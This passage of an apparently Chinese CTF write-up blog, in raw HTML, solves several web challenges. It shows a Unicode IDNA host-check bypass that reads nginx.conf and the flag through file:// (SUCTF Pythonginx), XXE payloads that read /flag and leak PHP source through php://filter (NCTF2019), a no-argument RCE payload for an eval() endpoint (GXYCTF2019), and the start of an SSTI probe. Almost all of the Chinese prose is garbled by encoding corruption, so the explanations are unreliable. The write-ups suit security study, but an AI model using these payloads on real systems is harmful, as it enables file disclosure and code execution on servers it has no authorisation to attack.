socket.setdefaulttimeout(<span class="hljs-number">1</span>)    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]    <span class="hljs-keyword">except</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">"Connection Timeout"</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getSign</span><span class="hljs-params">(action, param)</span>:</span>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span><span class="hljs-params">(content)</span>:</span>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span><span class="hljs-params">(param)</span>:</span>    check=param.strip().lower()    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">"gopher"</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">"file"</span>):        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:    app.debug = <span class="hljs-literal">False</span>    app.run(host=<span class="hljs-string">'0.0.0.0'</span>,port=<span class="hljs-number">80</span>)</code></pre></div><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>é¢˜ç›®ç»™å‡ºäº†æºç </p><div class="hljs"><pre><code class="hljs python"><span class="hljs-meta">@app.route('/getUrl', methods=['GET', 'POST'])</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getUrl</span><span class="hljs-params">()</span>:</span>    url = request.args.get(<span class="hljs-string">"url"</span>)  <span class="hljs-comment"># è·å–getæäº¤çš„urlå‚æ•°</span>    host = parse.urlparse(url).hostname <span class="hljs-comment">#è·å–urlä¸­çš„ä¸»æœºå</span>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:                    <span class="hljs-keyword">return</span> <span class="hljs-string">"æˆ‘æ‰Œ your problem? 111"</span>    parts = list(urlsplit(url))       <span class="hljs-comment">#å°†urlåˆ†éš”å¼€ åè®®ç±»å‹ ä¸»æœºå æ–‡ä»¶è·¯å¾„ å­˜å…¥åˆ—è¡¨ parts[1]ä¸ºä¸»æœºå</span>    host = parts[<span class="hljs-number">1</span>]    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">"æˆ‘æ‰Œ your problem? 222 "</span> + host    newhost = []    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">'.'</span>):        newhost.append(h.encode(<span class="hljs-string">'idna'</span>).decode(<span class="hljs-string">'utf-8'</span>))   <span class="hljs-comment">#å°†ä¸»æœºåä»¥.ä¸ºåˆ†å‰² è¿›è¡Œutf-8è§£ç </span>    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">'.'</span>.join(newhost)         <span class="hljs-comment">#é‡æ–°ç»„æˆä¸»æœºå</span>    <span class="hljs-comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span>    finalUrl = urlunsplit(parts).split(<span class="hljs-string">' '</span>)[<span class="hljs-number">0</span>]    host = parse.urlparse(finalUrl).hostname   <span class="hljs-comment"># è·å–æ–°çš„ä¸»æœºå   </span>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:        <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).read()    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">"æˆ‘æ‰Œ your problem? 333"</span>       &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;    &lt;!-- Do you know the nginx? --&gt;</code></pre></div><p>è€ƒå¯Ÿç‚¹1ï¼š</p><blockquote><p>2019black hatä¸€ä¸ªè®®é¢˜</p><div class="hljs"><pre><code class="hljs awk">https:<span class="hljs-regexp">//i</span>.blackhat.com<span class="hljs-regexp">/USA-19/</span>Thursday<span class="hljs-regexp">/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</span></code></pre></div><p>åœ¨unicodeä¸­å­—ç¬¦â„€(U+2100)ï¼Œå½“IDNAå¤„ç†æ­¤å­—ç¬¦æ—¶ï¼Œä¼šå°†â„€å˜æˆa/cï¼Œå› æ­¤å½“ä½ è®¿é—®æ­¤urlæ—¶ï¼ŒdnsæœåŠ¡å™¨ä¼šè‡ªåŠ¨å°†urlé‡å®šå‘åˆ°å¦ä¸€ä¸ªç½‘ç«™ã€‚å¦‚æœæœåŠ¡å™¨å¼•ç”¨å‰ç«¯urlæ—¶ï¼Œåªå¯¹åŸŸååšäº†é™åˆ¶ï¼Œé‚£ä¹ˆé€šè¿‡è¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥è½»æ¾ç»•è¿‡æœåŠ¡å™¨å¯¹åŸŸåçš„é™åˆ¶äº†ã€‚</p></blockquote><img src="https://i.loli.net/2020/10/29/5ixom8Hq7UYdRBV.png" srcset="/img/loading.gif" alt="utf-8.png" style="zoom:50%;"><p>è€ƒå¯Ÿç‚¹2:</p><blockquote><p>NginxæœåŠ¡å™¨</p><p><a href="https://zhuanlan.zhihu.com/p/34943332ï¼Œè¿™ç¯‡æ–‡ç« ä»‹ç»çš„å¾ˆè¯¦ç»†" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/34943332ï¼Œè¿™ç¯‡æ–‡ç« ä»‹ç»çš„å¾ˆè¯¦ç»†</a></p><p>è¿™é‡Œåªè¦çŸ¥é“nginxæœåŠ¡å™¨çš„ä¸»è¦æ–‡ä»¶è·¯å¾„</p><p>é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginx </p><p>ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf </p><p>ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service </p><p>æ¨¡å—ï¼š/usr/lisb64/nginx/modules </p><p>åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx </p><p>ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html </p><p>æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx </p><p>é…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š/usr/local/nginx/conf/nginx.conf  //è¿™é¢˜è¦ç”¨åˆ°çš„è·¯å¾„</p></blockquote><p>è¿™é‡Œè¦è¯»å–çš„æ˜¯æ–‡ä»¶ï¼Œæ‰€ä»¥ä½¿ç”¨çš„fileåè®®</p><p>ç›´æ¥å¤Ÿé€ </p><div class="hljs"><pre><code class="hljs vim"><span class="hljs-keyword">file</span>://suctf.<span class="hljs-keyword">cc</span>/usr/local/nginx/<span class="hljs-keyword">conf</span>/nginx.<span class="hljs-keyword">conf</span>åˆ©ç”¨æ¼æ´æ”¹ä¸º<span class="hljs-keyword">file</span>://suctf.<span class="hljs-keyword">c</span>â„†sr/local/nginx/<span class="hljs-keyword">conf</span>/nginx.<span class="hljs-keyword">conf</span></code></pre></div><p>ç»™å‡ºflagè·¯å¾„</p><div class="hljs"><pre><code class="hljs crmsh">server &#123; listen <span class="hljs-number">80</span>; <span class="hljs-keyword">location</span> <span class="hljs-title">/ &#123; try_files</span> $uri @app; &#125; <span class="hljs-keyword">location</span> <span class="hljs-title">@app</span> &#123; include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; &#125; <span class="hljs-keyword">location</span> <span class="hljs-title">/static</span> &#123; alias /app/static; &#125; <span class="hljs-comment"># location /flag &#123; # alias /usr/fffffflag; # &#125; &#125;</span> æ„é€ file://suctf.câ„†sr/fffffflagæ‹¿åˆ°flag</code></pre></div><p>ä¸ºäº†ç›´è§‚æ„Ÿå—urlå¤„ç†è¿‡ç¨‹ï¼Œå†™äº†è„šæœ¬</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlsplit, urlunspliturl= <span class="hljs-string">"file://suctf.câ„†sr/local/nginx/conf/nginx.conf"</span>host = parse.urlparse(url).hostname<span class="hljs-comment">#print(host)</span>parts = list(urlsplit(url))print(parts)newhost=[]<span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">'.'</span>):    newhost.append(h.encode(<span class="hljs-string">'idna'</span>).decode(<span class="hljs-string">'utf-8'</span>))print(newhost)parts[<span class="hljs-number">1</span>] = <span class="hljs-string">'.'</span>.join(newhost)print(parts)finalUrl = urlunsplit(parts).split(<span class="hljs-string">' '</span>)[<span class="hljs-number">0</span>]print(finalUrl)</code></pre></div><p>ç»“æœ</p><div class="hljs"><pre><code class="hljs vim">[<span class="hljs-string">'file'</span>, <span class="hljs-string">'suctf.câ„†sr'</span>, <span class="hljs-string">'/local/nginx/conf/nginx.conf'</span>, <span class="hljs-string">''</span>, <span class="hljs-string">''</span>][<span class="hljs-string">'suctf'</span>, <span class="hljs-string">'cc/usr'</span>][<span class="hljs-string">'file'</span>, <span class="hljs-string">'suctf.cc/usr'</span>, <span class="hljs-string">'/local/nginx/conf/nginx.conf'</span>, <span class="hljs-string">''</span>, <span class="hljs-string">''</span>]<span class="hljs-keyword">file</span>://suctf.<span class="hljs-keyword">cc</span>/usr/local/nginx/<span class="hljs-keyword">conf</span>/nginx.<span class="hljs-keyword">conf</span></code></pre></div><p>æ‰¾å‡ºç±»ä¼¼å¯ç”¨å­—ç¬¦çš„è„šæœ¬</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">128</span>,<span class="hljs-number">65537</span>):    tmp=chr(i)    <span class="hljs-keyword">try</span>:        res = tmp.encode(<span class="hljs-string">'idna'</span>).decode(<span class="hljs-string">'utf-8'</span>)        <span class="hljs-keyword">if</span>(<span class="hljs-string">"-"</span>) <span class="hljs-keyword">in</span> res:            <span class="hljs-keyword">continue</span>        print(<span class="hljs-string">"U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; "</span>.format(tmp, res, i))    <span class="hljs-keyword">except</span>:        <span class="hljs-keyword">pass</span></code></pre></div><hr><p>å‚è€ƒï¼š</p><blockquote><p><a href="https://blog.csdn.net/qq_42181428/article/details/99741920" target="_blank" rel="noopener">https://blog.csdn.net/qq_42181428/article/details/99741920</a></p></blockquote><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p><code>xxe</code>æ”»å‡»</p><p>æŠ“åŒ…æ˜¾ç¤ºçš„ç»“æœæ˜¯</p><div class="hljs"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>a<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div><p>æ˜¯xmlæ ¼å¼çš„æ•°æ®ï¼Œæ‰€ä»¥å¯èƒ½å­˜åœ¨xxeæ¼æ´ï¼ˆå¤–éƒ¨å®ä½“æ³¨å…¥ï¼‰ï¼Œå³åˆ©ç”¨è¾“å…¥ä½ç½®å‘å­˜å‚¨çš„è¡¨ä¸­æ·»åŠ ä¸€ä¸ªå¤–éƒ¨å®ä½“ï¼Œè®©è¿™ä¸ªå®ä½“åŒ…å«å†…éƒ¨æ–‡ä»¶ï¼Œé€ æˆæ•°æ®æ³„éœ²ã€‚</p><p>xmlæ³¨å…¥æ˜¯åˆ©ç”¨é—­åˆæ ‡ç­¾æ”¹å†™XMLæ–‡ä»¶å®ç°æ›´æ”¹æ•°æ®ï¼Œxxeæ˜¯å¼•ç”¨å¤–éƒ¨å®ä½“æ¥è¾¾åˆ°ç›®çš„ã€‚</p><p>phpå¼•ç”¨å¤–éƒ¨å®ä½“ï¼Œå¸¸è§çš„åè®®</p><div class="hljs"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span>://æ–‡ä»¶ç»å¯¹è·¯å¾„ å¦‚ï¼š<span class="hljs-built_in">file</span>:<span class="hljs-comment">///etc/passwd</span><span class="hljs-keyword">http</span>://url/<span class="hljs-built_in">file</span>.txtphp://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=xxx.php</code></pre></div><p>è¿™ç¯‡åšå®¢å†™çš„å¾ˆæ¸…æ¥šï¼Œ<a href="https://xz.aliyun.com/t/6887" target="_blank" rel="noopener">ä¼ é€é—¨</a></p><p>ç›´æ¥æ„é€ payloadï¼Œæ‹¿åˆ°flag</p><div class="hljs"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">hack</span> [</span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span>  <span class="hljs-meta-string">"file:///flag"</span>&gt;</span></span><span class="hljs-meta">]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div><blockquote><!ENTITY file SYSTEM  "file:///flag"><p>è¿™é‡Œçš„fileæ˜¯å¤–éƒ¨å®ä½“</p><p><username>&file;</username></p><p>è¿™é‡Œçš„&amp;fileæ˜¯xmlä¸­çš„å‚æ•°</p></blockquote><p>è¿˜å¯ä»¥ç”¨php://filter/read=convert.base64-encode/resource=xxx.php,è¯»å–æºç </p><p>ç›´æ¥æ„é€ </p><div class="hljs"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">hack</span> [</span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span>  <span class="hljs-meta-string">"php://filter/read=convert.base64-encode/resource=doLogin.php"</span>&gt;</span></span><span class="hljs-meta">]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div><p>è§£ç åçš„æºç ï¼Œå¯ä»¥æ‹¿åˆ°adminå’Œå¯†ç ï¼Œä½†æ˜¯ç™»å½•ä¹Ÿæ²¡å•¥ä¸œè¥¿ï¼Œè€ƒå¯Ÿç‚¹å°±æ˜¯xxeã€‚ã€‚ã€‚</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/**</span><span class="hljs-comment">* autor: c0ny1</span><span class="hljs-comment">* date: 2018-2-7</span><span class="hljs-comment">*/</span>$USERNAME = <span class="hljs-string">'admin'</span>; <span class="hljs-comment">//ç’ï¹€å½¿</span>$PASSWORD = <span class="hljs-string">'024b87931a03f738fff6693ce0a78c88'</span>; <span class="hljs-comment">//ç€µå—™çˆœ</span>$result = <span class="hljs-keyword">null</span>;libxml_disable_entity_loader(<span class="hljs-keyword">false</span>);$xmlfile = file_get_contents(<span class="hljs-string">'php://input'</span>);<span class="hljs-keyword">try</span>&#123;$dom = <span class="hljs-keyword">new</span> DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$creds = simplexml_import_dom($dom);$username = $creds-&gt;username;$password = $creds-&gt;password;<span class="hljs-keyword">if</span>($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;$result = sprintf(<span class="hljs-string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="hljs-number">1</span>,$username);&#125;<span class="hljs-keyword">else</span>&#123;$result = sprintf(<span class="hljs-string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="hljs-number">0</span>,$username);&#125;&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-keyword">Exception</span> $e)&#123;$result = sprintf(<span class="hljs-string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="hljs-number">3</span>,$e-&gt;getMessage());&#125;header(<span class="hljs-string">'Content-Type: text/html; charset=utf-8'</span>);<span class="hljs-keyword">echo</span> $result;<span class="hljs-meta">?&gt;</span></code></pre></div><h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p>.gitæºç æ³„éœ²</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">"flag.php"</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;"</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'exp'</span>]))&#123;    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="hljs-string">'exp'</span>])) &#123;        <span class="hljs-keyword">if</span>(<span class="hljs-string">';'</span> === preg_replace(<span class="hljs-string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="hljs-keyword">NULL</span>, $_GET[<span class="hljs-string">'exp'</span>])) &#123;            <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="hljs-string">'exp'</span>])) &#123;                <span class="hljs-comment">// echo $_GET['exp'];</span>                @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'exp'</span>]);            &#125;            <span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">die</span>(<span class="hljs-string">"è¿˜å·®ä¸€ç‚¹å“¦ï¼"</span>);            &#125;        &#125;        <span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">"å†å¥½å¥½æƒ³æƒ³ï¼"</span>);        &#125;    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼"</span>);    &#125;&#125;<span class="hljs-comment">// highlight_file(__FILE__);</span><span class="hljs-meta">?&gt;</span></code></pre></div><p>ç¬¬ä¸€ä¸ª<code>if</code>ï¼šå¸¸ç”¨çš„ä¼ªåè®®è¢«ç¦äº†</p><p>ç¬¬äºŒä¸ª<code>if</code>æ­£åˆ™åŒ¹é…ï¼Œ<code>?R</code> è¡¨ç¤ºå¼•ç”¨å½“å‰è¡¨è¾¾å¼ï¼Œå°±æ¯”å¦‚å¼•ç”¨ä¸€æ¬¡ï¼š<br><code>[a-z,_]+[a-z,_]+\((?R)?\)</code>ï¼Œæ‰€ä»¥ä¸€ä¸ªåˆæ³•çš„è¡¨è¾¾å¼å¯ä»¥æ˜¯<code>a(b();)</code>ï¼Œæ‹¬å·å’Œå­—ç¬¦ç»„æˆçš„</p><p>ç¬¬ä¸‰ä¸ª<code>if</code>å°±è¿‡æ»¤ä¸€äº›å‡½æ•°åŒ…å«çš„å­—ç¬¦ï¼Œå¯¼è‡´äº†è®¸å¤šå‡½æ•°æ— æ³•ä½¿ç”¨ã€‚</p><blockquote><p>1.éœ€è¦ä»¥GETå½¢å¼ä¼ å…¥ä¸€ä¸ªåä¸ºexpçš„å‚æ•°ã€‚å¦‚æœæ»¡è¶³æ¡ä»¶ä¼šæ‰§è¡Œè¿™ä¸ªexpå‚æ•°çš„å†…å®¹ã€‚ </p><p>2.è¿‡æ»¤äº†å¸¸ç”¨çš„å‡ ä¸ªä¼ªåè®®ï¼Œä¸èƒ½ä»¥ä¼ªåè®®è¯»å–æ–‡ä»¶ã€‚ </p><p>3.(?R)å¼•ç”¨å½“å‰è¡¨è¾¾å¼ï¼Œåé¢åŠ äº†?é€’å½’è°ƒç”¨ã€‚åªèƒ½åŒ¹é…é€šè¿‡æ— å‚æ•°çš„å‡½æ•°ã€‚ </p><p>4.æ­£åˆ™åŒ¹é…æ‰äº†et/na/infoç­‰å…³é”®å­—ï¼Œå¾ˆå¤šå‡½æ•°éƒ½ç”¨ä¸äº†ã€‚</p><p> 5ï¼ševal($_GET[â€˜expâ€™]); </p></blockquote><p>è€ƒå¯Ÿç‚¹æ— å‚RCE</p><p>expï¼š</p><div class="hljs"><pre><code class="hljs reasonml">?exp=highlight<span class="hljs-constructor">_file(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>)))));</code></pre></div><p>è¿™é‡Œç”¨åˆ°åè½¬å‡½æ•°æ˜¯å› ä¸ºï¼Œflag.phpåœ¨å€’æ•°ç¬¬äºŒä¸ªä½ç½®ï¼Œæ— æ³•ä½¿ç”¨end()è·å–ï¼Œåè½¬åå¯ä»¥ç›´æ¥å—ç”¨next()è·å–ï¼Œæ–¹ä¾¿å¾ˆå¤šã€‚</p><p><strong>localeconv()</strong> å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚</p><p><strong>current()</strong> å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚</p><blockquote><p>æ¯ä¸ªæ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çš„æŒ‡é’ˆæŒ‡å‘å®ƒçš„â€å½“å‰â€å…ƒç´ ï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</p><p><strong>æç¤ºï¼š</strong>è¯¥å‡½æ•°ä¸ä¼šç§»åŠ¨æ•°ç»„å†…éƒ¨æŒ‡é’ˆã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œè¯·ä½¿ç”¨ <a href="https://www.w3school.com.cn/php/func_array_krsort.asp" target="_blank" rel="noopener">next()</a> å’Œ <a href="https://www.w3school.com.cn/php/func_array_krsort.asp" target="_blank" rel="noopener">prev()</a> å‡½æ•°ã€‚</p><p>ç›¸å…³çš„æ–¹æ³•ï¼š</p><ul><li><a href="https://www.w3school.com.cn/php/func_array_end.asp" target="_blank" rel="noopener">end()</a> - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.w3school.com.cn/php/func_array_next.asp" target="_blank" rel="noopener">next()</a> - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.w3school.com.cn/php/func_array_prev.asp" target="_blank" rel="noopener">prev()</a> - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.w3school.com.cn/php/func_array_reset.asp" target="_blank" rel="noopener">reset()</a> - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.w3school.com.cn/php/func_array_each.asp" target="_blank" rel="noopener">each()</a> - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨</li></ul></blockquote><p><strong>array_reverse()</strong> å‡½æ•°ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ã€‚</p><p>array_reverse() å‡½æ•°å°†åŸæ•°ç»„ä¸­çš„å…ƒç´ é¡ºåºç¿»è½¬ï¼Œåˆ›å»ºæ–°çš„æ•°ç»„å¹¶è¿”å›ã€‚</p><p>å¦‚æœç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šä¸º trueï¼Œåˆ™å…ƒç´ çš„é”®åä¿æŒä¸å˜ï¼Œå¦åˆ™é”®åå°†ä¸¢å¤±ã€‚</p><p><a href="https://www.w3school.com.cn/php/func_array_reverse.asp" target="_blank" rel="noopener">è¯¦æƒ…</a></p><p><strong>array_flip()</strong> å‡½æ•°ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚</p><p>array_flip() å‡½æ•°è¿”å›ä¸€ä¸ªåè½¬åçš„æ•°ç»„ï¼Œå¦‚æœåŒä¸€å€¼å‡ºç°äº†å¤šæ¬¡ï¼Œåˆ™æœ€åä¸€ä¸ªé”®åå°†ä½œä¸ºå®ƒçš„å€¼ï¼Œæ‰€æœ‰å…¶ä»–çš„é”®åéƒ½å°†ä¸¢å¤±ã€‚</p><p>å¦‚æœåŸæ•°ç»„ä¸­çš„å€¼çš„æ•°æ®ç±»å‹ä¸æ˜¯å­—ç¬¦ä¸²æˆ–æ•´æ•°ï¼Œå‡½æ•°å°†æŠ¥é”™ã€‚</p><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>é¦–å…ˆå†hint.phpä¸­å‘ç°äº†æç¤º</p><p><img src="https://i.loli.net/2020/12/16/uw4fMRbPYv2oHti.png" srcset="/img/loading.gif" alt="image-20201216083026655"></p><p>äºæ˜¯æŠ“åŒ…çœ‹çœ‹cookieæ˜¯å•¥ï¼Œåœ¨flag.phpé¡µé¢éšä¾¿ç™»å½•åcookieååŠæ®µçš„å€¼ä¸ºç”¨æˆ·åï¼Œå°è¯•äº†sqlæ³¨å…¥ï¼Œå‘½ä»¤æ‰§è¡Œï¼Œéƒ½ä¸æ˜¯ï¼Œäºæ˜¯è¯•è¯•äº†æ¨¡æ¿æ³¨å…¥</p><p>user={{2*4}}ï¼Œå‡ºç°ä¸‹å›¾çš„æ ·å­ï¼Œè¯´æ˜äº†æ‹¬å·ä¸­çš„è¡¨è¾¾å¼è¢«æ‰§è¡Œäº†ï¼Œæ‰€ä»¥ç¡®å®šæ˜¯æ¨¡æ¿æ³¨å…¥</p><p><img src="https://i.loli.net/2020/12/16/8irHUQKcXDZYMWv.png" srcset="/img/loading.gif" alt="image-20201216082222224"></p><p>ä¸‹é¢å°±æ˜¯è¦æ‰¾åˆ°è¯»å–flagçš„payload</p><p>åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªå°†æ¨¡æ¿æ³¨å…¥è¯´çš„å¾ˆè¯¦ç»†çš„åšå®¢ï¼Œ<a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig" target="_blank" rel="noopener">ä¼ é€é—¨</a></p><p>ä¸‹é¢éœ€è¦åˆ¤æ–­è¿™ä¸ªé¢˜ç›®æ˜¯å“ªä¸ªç±»å‹çš„æ¨¡æ¿ï¼Œç»“åˆä¸‹é¢çš„å›¾ç‰‡åšæµ‹è¯•</p><p><img src="https://i.loli.net/2020/12/16/GQid7jrR562I8te.png" srcset="/img/loading.gif" alt="image-20201216085015609"></p><p><img src="https://i.loli.net/2020/12/16/9SZY8zLwvtDeiyT.png" srcset="/img/loading.gif" alt="image-20201216084914194"></p><div class="hljs"><pre><code class="hljs angelscript">user=admin&#123;&#123;<span class="hljs-number">1</span>*<span 